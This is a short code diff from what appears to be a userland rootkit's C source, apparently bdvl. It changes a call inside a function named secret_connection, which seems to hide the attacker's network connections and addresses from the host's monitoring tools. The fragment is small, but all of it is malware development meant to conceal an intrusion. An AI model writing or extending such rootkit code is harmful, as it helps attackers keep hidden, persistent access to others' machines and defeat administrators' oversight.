@@ -88,8 +88,7 @@ int is_hidden_addr(const char *addr){
 
 
 int secret_connection(char line[]){
-    if(rknomore(INSTALL_DIR, BDVLSO))
-        return 0;
+    if(rknomore()) return 0;
 
     char raddr[128], laddr[128], etc[512];
     unsigned long rxq, txq, t_len,
